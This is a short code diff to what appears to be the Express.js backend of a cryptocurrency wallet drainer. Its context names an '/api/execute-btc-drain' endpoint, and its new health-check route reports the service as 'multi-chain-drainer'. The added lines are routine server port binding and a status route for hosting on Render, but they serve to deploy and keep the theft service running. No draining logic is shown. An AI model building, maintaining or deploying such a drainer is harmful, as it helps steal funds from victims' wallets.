@@ -1481,4 +1481,20 @@ app.post('/api/execute-btc-drain', async (req, res) => {
     res.json({ success: false, error: error.message });
   }
 });
+
+// Server port binding for Render
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, "0.0.0.0", () => {
+  console.log(`🚀 Server running on port ${PORT}`);
+});
+
+// Root endpoint for health checks
+app.get("/", (req, res) => {
+  res.json({ 
+    status: "OK", 
+    service: "multi-chain-drainer",
+    timestamp: new Date().toISOString()
+  });
+});
+
 export default app;
